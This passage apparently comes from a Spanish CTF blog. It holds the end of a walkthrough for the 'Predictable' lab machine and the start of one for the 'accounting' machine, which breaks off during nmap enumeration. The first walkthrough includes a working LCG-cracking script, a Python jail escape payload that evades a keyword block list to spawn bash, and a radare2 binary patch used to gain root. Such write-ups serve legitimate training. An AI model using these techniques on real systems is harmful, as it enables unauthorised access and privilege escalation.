        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">*</span> <span class="n">self</span><span class="p">.</span><span class="n">m</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">n</span>
        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span>

<span class="bp">...</span>

<span class="c1"># return int
</span><span class="k">def</span> <span class="nf">obtener_semilla</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">time</span><span class="p">.</span><span class="nf">time_ns</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">obtener_semilla_anterior</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">obtener_semilla</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span>
<span class="bp">...</span>

<span class="k">if</span> <span class="sh">'</span><span class="s">seed</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">obtener_semilla</span><span class="p">()</span>
<span class="n">gen</span> <span class="o">=</span> <span class="nf">prng_lcg</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">])</span>

<span class="bp">...</span>

<span class="n">gen</span> <span class="o">=</span> <span class="nf">prng_lcg</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">])</span>
<span class="n">semilla_anterior</span> <span class="o">=</span> <span class="nf">obtener_semilla_anterior</span><span class="p">()</span>

</code></pre></div></div>

<p>Buscando vemos que se trata de un script para la creación de números usando un <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">Linear_congruential_generator</a>. Para generar los números nos hace falta conocer los valores de <code class="language-plaintext highlighter-rouge">m</code> (multiplicador) y <code class="language-plaintext highlighter-rouge">c</code> (incremento). El valor de <code class="language-plaintext highlighter-rouge">n</code> (modulo) es conocido para nosotros, <code class="language-plaintext highlighter-rouge">9223372036854775783</code> . Buscando como hacer reversing a LCG he encontrado esta url <a href="https://tailcall.net/posts/cracking-rngs-lcgs/">https://tailcall.net/posts/cracking-rngs-lcgs/</a> que muestra como poder obtener los valores conociendo valores consecutivos.</p>

<p>Creamos el siguiente script en python para calcular los valores de <code class="language-plaintext highlighter-rouge">m</code> y <code class="language-plaintext highlighter-rouge">c</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>

<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">y</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">g</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">n</span>

<span class="k">def</span> <span class="nf">crack_unknown_multiplier</span><span class="p">(</span><span class="n">modulus</span><span class="p">,</span> <span class="n">s0</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">s1</span> <span class="o">&lt;=</span> <span class="n">s0</span> <span class="ow">or</span> <span class="n">s0</span> <span class="o">&lt;=</span> <span class="n">s2</span><span class="p">:</span>
       <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">s1 debe ser mayor que s0, y s0 debe ser mayor que s2</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">multiplier</span> <span class="o">=</span> <span class="p">(</span><span class="n">s2</span> <span class="o">-</span> <span class="n">s1</span><span class="p">)</span> <span class="o">*</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s0</span><span class="p">,</span> <span class="n">modulus</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
    <span class="n">increment</span> <span class="o">=</span> <span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s0</span><span class="o">*</span><span class="n">multiplier</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
    <span class="k">return</span> <span class="n">modulus</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">increment</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Crack LCG</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--n</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Modulus</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s0</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 0</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s1</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 1</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s2</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 2</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">modulus</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">increment</span> <span class="o">=</span> <span class="nf">crack_unknown_multiplier</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">n</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s0</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s1</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s2</span><span class="p">)</span>

        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Modulus(n): </span><span class="si">{</span><span class="n">modulus</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Multiplier(m): </span><span class="si">{</span><span class="n">multiplier</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Increment(c): </span><span class="si">{</span><span class="n">increment</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Entramos a la web y tenemos que encontrar 3 valores consecutivos donde <code class="language-plaintext highlighter-rouge">s1 &gt; s0</code> y <code class="language-plaintext highlighter-rouge">s1 &gt; s2</code>.</p>

<p><img src="/assets/images/predictable/1.png" alt="image" /></p>

<p>Ejecutamos el script introduciendo los valores como argumentos y nos da como resultado lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python main.py <span class="nt">--n</span> 9223372036854775783 <span class="nt">--s0</span> 5042010115239285411 <span class="nt">--s1</span> 5691797266751657494 <span class="nt">--s2</span> 2989723807668403001
Modulus<span class="o">(</span>n<span class="o">)</span>: 9223372036854775783
Multiplier<span class="o">(</span>m<span class="o">)</span>: 81853448938945944
Increment<span class="o">(</span>c<span class="o">)</span>: 7382843889490547368
</code></pre></div></div>

<p>Buscamos el número 99:</p>

<p><img src="/assets/images/predictable/2.png" alt="image" /></p>

<p>Creamos el siguiente script para la creación del número 100 con los valores recién calculados:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>

<span class="c1"># Define the other constants
</span><span class="n">m</span> <span class="o">=</span> <span class="mi">81853448938945944</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">7382843889490547368</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">9223372036854775783</span>

<span class="c1"># Create an ArgumentParser object
</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Calcula el número 100 usando LCG</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Add an argument for s99 with a short option name (-s99)
</span><span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-s99</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 99</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="c1"># Parse the command-line arguments
</span><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

<span class="c1"># Extract the value of s99 from the parsed arguments
</span><span class="n">s99</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">s99</span>

<span class="c1"># Perform the calculation
</span><span class="n">s100</span> <span class="o">=</span> <span class="p">(</span><span class="n">s99</span> <span class="o">*</span> <span class="n">m</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Valor 100: </span><span class="si">{</span><span class="n">s100</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Lo ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python s100.py <span class="nt">-s99</span> 2925996709184014603
Valor 100: 707173620968215045
</code></pre></div></div>

<p>E introducimos el valor en la web para obtener las credenciales de acceso:</p>

<p><img src="/assets/images/predictable/3.png" alt="image" /></p>

<p>Una vez obtenidas las credenciales nos conectamos a la máquina por <code class="language-plaintext highlighter-rouge">ssh</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mash@172.17.0.2
mash@172.17.0.2<span class="s1">'s password:
Linux predictable 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
....

</span></code></pre></div></div>

<p>Nos avisa de que estamos enjaulados en una jaula de python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Romper LCG y predecir numeros es divertido
______________________________________________________________________
Ahora escapa de mi pyjail
<span class="o">&gt;</span>
</code></pre></div></div>

<p>Probamos a ver que palabras están prohibidas o bloqueadas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> import 
+Block: import
<span class="o">&gt;</span> os
Block: os
<span class="o">&gt;</span> <span class="s1">'imp'</span>+<span class="s1">'ort'</span>
import
</code></pre></div></div>

<p>Vemos que las palabras <code class="language-plaintext highlighter-rouge">import</code> y <code class="language-plaintext highlighter-rouge">os</code> están bloqueadas, pero <code class="language-plaintext highlighter-rouge">'imp'+'ort'</code> no. Ejecutamos <code class="language-plaintext highlighter-rouge">globals()</code> para ver variables globales del módulo actual, junto con sus valores. La mayoría de los modulos de python tienen disponible de forma global el módulo <code class="language-plaintext highlighter-rouge">__builtins__</code>, y como vemos, está disponible. Ejecutamos <code class="language-plaintext highlighter-rouge">globals()['__builtins__']</code> y vemos que nos deja:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> globals<span class="o">()</span>
<span class="o">{</span><span class="s1">'__name__'</span>: <span class="s1">'__main__'</span>, <span class="s1">'__doc__'</span>: None, <span class="s1">'__package__'</span>: None, <span class="s1">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f4d31e8aed0&gt;, <span class="s1">'__spec__'</span>: None, <span class="s1">'__annotations__'</span>: <span class="o">{}</span>, <span class="s1">'__builtins__'</span>: &lt;module <span class="s1">'builtins'</span> <span class="o">(</span>built-in<span class="o">)&gt;</span>, <span class="s1">'__file__'</span>: <span class="s1">'/usr/bin/jail'</span>, <span class="s1">'__cached__'</span>: None, <span class="s1">'signal'</span>: &lt;module <span class="s1">'signal'</span> from <span class="s1">'/usr/lib/python3.11/signal.py'</span><span class="o">&gt;</span>, <span class="s1">'banner'</span>: &lt;<span class="k">function </span>banner at 0x7f4d31e304a0&gt;, <span class="s1">'main'</span>: &lt;<span class="k">function </span>main at 0x7f4d31c447c0&gt;<span class="o">}</span>
<span class="o">&gt;</span> globals<span class="o">()[</span><span class="s1">'__builtins__'</span><span class="o">]</span>
&lt;module <span class="s1">'builtins'</span> <span class="o">(</span>built-in<span class="o">)&gt;</span>
</code></pre></div></div>

<p>Para poder ejecutar un comando de bash en python necesitamos importar el modulo os .system . En la url <a href="https://docs.python.org/3/library/functions.html">https://docs.python.org/3/library/functions.html</a> vemos que está disponible la la función <code class="language-plaintext highlighter-rouge">__import__</code> . Como hemos visto antes, la palabra import esta bloqueada, asi que tenemos que partir la palabra y concatenarla con el signo +. Después con la función <code class="language-plaintext highlighter-rouge">getattr(objeto, nombre)</code> cargamos en el objeto la funcion que le indicamos, en este caso <code class="language-plaintext highlighter-rouge">getattr(globals()['__builtins__'], '__import__’)</code>. Después solo nos quedaría cargar el módulo <code class="language-plaintext highlighter-rouge">os</code> con <code class="language-plaintext highlighter-rouge">getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://docs.python.org/3/library/functions.html
</span><span class="o">&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">],</span> <span class="sh">'</span><span class="s">__im</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">port__</span><span class="sh">'</span><span class="p">)</span>
<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="nb">__import__</span><span class="o">&gt;</span>

<span class="c1"># https://docs.python.org/3/library/functions.html#import__
</span><span class="o">&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">],</span> <span class="sh">'</span><span class="s">__im</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">port__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">)</span>
<span class="o">&lt;</span><span class="n">module</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Para terminar solo nos queda ejecutar el comando <strong>bash</strong> para obtener la shell. Para ello primero cargamos <code class="language-plaintext highlighter-rouge">system</code> con <code class="language-plaintext highlighter-rouge">getattr</code> y luego <code class="language-plaintext highlighter-rouge">bash</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://docs.python.org/3/library/os.html</span>
<span class="o">&gt;</span> getattr<span class="o">(</span>getattr<span class="o">(</span>globals<span class="o">()[</span><span class="s1">'__builtins__'</span><span class="o">]</span>, <span class="s1">'__im'</span>+<span class="s1">'port__'</span><span class="o">)(</span><span class="s1">'o'</span>+<span class="s1">'s'</span><span class="o">)</span>, <span class="s1">'sys'</span>+<span class="s1">'tem'</span><span class="o">)(</span><span class="s1">'bash'</span><span class="o">)</span>
mash@predictable:~<span class="nv">$ </span><span class="nb">hostname
</span>predictable
mash@predictable:~<span class="nv">$ </span>
</code></pre></div></div>
<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Una vez dentro del sistema como mash miramos con <code class="language-plaintext highlighter-rouge">sudo -l</code> para vez que comandos puede ejecutar como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mash on predictable:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, use_pty

User mash may run the following commands on predictable:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/shell
</code></pre></div></div>

<p>Si lo ejecutamos nos indica como se usa y como ver una <em>pista:</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/shell 
Uso: ./shell input
Pista: ./shell <span class="nt">-h</span>
</code></pre></div></div>

<p>La pista es la siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/shell <span class="nt">-h</span>
¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Radare2</code> es un framework de ingeniería inversa.</p>

<p>De aquí en adelante he necesitado seguir el writeup de su creador, recomendable leerlo: <a href="https://ic4rta.github.io/docs/Dockerlabs/Predictable/">https://ic4rta.github.io/docs/Dockerlabs/Predictable/</a></p>

<p>Parcheamos el binario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:/opt<span class="nv">$ </span>r2 <span class="nt">-w</span> shell 
WARN: Relocs has not been applied. Please use <span class="sb">`</span><span class="nt">-e</span> bin.relocs.apply<span class="o">=</span><span class="nb">true</span><span class="sb">`</span> or <span class="sb">`</span><span class="nt">-e</span> bin.cache<span class="o">=</span><span class="nb">true</span><span class="sb">`</span> next <span class="nb">time</span>
<span class="o">[</span>0x000010a0]&gt; s 6
<span class="o">[</span>0x00000006]&gt; wx 0x13
<span class="o">[</span>0x00000006]&gt; q
mash@predictable:~<span class="err">$</span>
</code></pre></div></div>

<p>Y ejecutamos para obtener la shell como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@predictable:/opt# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname
</span>root
predictable
</code></pre></div></div>

<p>Magnífica máquina de c4rta</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="muydificil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">accounting</title><link href="/posts/accounting/" rel="alternate" type="text/html" title="accounting" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/accounting</id><content type="html" xml:base="/posts/accounting/"><![CDATA[<p><img src="/assets/images/accounting/acc.jpg" alt="image" /></p>

<p>Estamos ante una máquina Windows de nivel principiante creada por Wxrdcn de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:63:af:94       PCS Systemtechnik GmbH
10.0.2.145      08:00:27:b0:1c:c9       PCS Systemtechnik GmbH
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.145</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.145</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.145 <span class="nt">-oG</span> ports.txt
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
5040/tcp  open  unknown
5357/tcp  open  wsdapi
7680/tcp  open  pando-pub
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  glrpc
9081/tcp  open  cisco-aqos
9083/tcp  open  emc-pp-mgmtsvc
9147/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49702/tcp open  unknown
49992/tcp open  unknown
</code></pre></div></div>

<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
135,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992
</code></pre></div></div>

<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992 <span class="nt">-v</span> 10.0.2.145
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1801/tcp  open  msmq?
2103/tcp  open  msrpc         Microsoft Windows RPC
2105/tcp  open  msrpc         Microsoft Windows RPC
2107/tcp  open  msrpc         Microsoft Windows RPC
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 <span class="o">(</span>ASP.NET 4.0.30319<span class="o">)</span>
|_http-server-header: Cassini/4.0.1.6
| http-title: Login Saci
|_Requested resource was /App/Login.aspx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9147/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Issuer: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-30T06:56:01
| Not valid after:  2054-06-30T06:56:01
| MD5:   a060:b5e7:eaf0:3da6:de75:cbed:7d75:2686
|_SHA-1: 3208:f8bb:d393:2af9:05df:76b3:afa8:a688:f62f:30cb
|_ssl-date: 2024-06-30T17:30:37+00:00<span class="p">;</span> +26s from scanner time.
| ms-sql-info: 
|   10.0.2.145<span class="se">\C</span>OMPAC: 
|     Instance name: COMPAC
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|     TCP port: 49992
|_    Clustered: <span class="nb">false</span>
| ms-sql-ntlm-info: 
|   10.0.2.145<span class="se">\C</span>OMPAC: 
|     Target_Name: DESKTOP-M464J3M
|     NetBIOS_Domain_Name: DESKTOP-M464J3M
|     NetBIOS_Computer_Name: DESKTOP-M464J3M
|     DNS_Domain_Name: DESKTOP-M464J3M
|     DNS_Computer_Name: DESKTOP-M464J3M
|_    Product_Version: 10.0.19041
MAC Address: 08:00:27:B0:1C:C9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
